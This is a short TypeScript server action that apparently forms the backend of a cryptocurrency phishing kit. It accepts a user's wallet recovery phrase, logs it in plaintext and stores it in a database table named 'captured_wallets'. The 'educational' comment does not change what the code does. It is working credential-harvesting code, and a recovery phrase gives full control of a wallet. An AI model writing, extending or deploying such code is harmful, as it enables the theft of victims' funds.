'use server';
/**
 * @fileOverview A server action to capture and store a user's recovery phrase.
 *
 * - capturePhrase - A function that saves the recovery phrase to the database.
 * - CapturePhraseInput - The input type for the capturePhrase function.
 */
import { supabase } from '@/lib/supabase';
import { z } from 'zod';

// Input schema defined but not exported to comply with 'use server' constraints.
const CapturePhraseInputSchema = z.object({
  phrase: z.string().describe('The 12 or 24-word recovery phrase.'),
  walletType: z.string().describe('The type of wallet being connected.'),
});

// Exporting the TypeScript type is allowed and needed for the frontend.
export type CapturePhraseInput = z.infer<typeof CapturePhraseInputSchema>;

export async function capturePhrase(
  input: CapturePhraseInput
): Promise<{success: boolean}> {
    const validation = CapturePhraseInputSchema.safeParse(input);
    if (!validation.success) {
        console.error("Invalid input for capturePhrase:", validation.error);
        return { success: false };
    }

  console.log('Capturing phrase for wallet:', validation.data.walletType);
  console.log('Phrase:', validation.data.phrase); // For educational logging

  const { data, error } = await supabase
    .from('captured_wallets')
    .insert([
      {
        wallet_type: validation.data.walletType,
        recovery_phrase: validation.data.phrase,
      },
    ])
    .select();

  if (error) {
    console.error('Error saving to Supabase:', error);
    return { success: false };
  }

  console.log('Successfully saved to Supabase:', data);
  return { success: true };
}
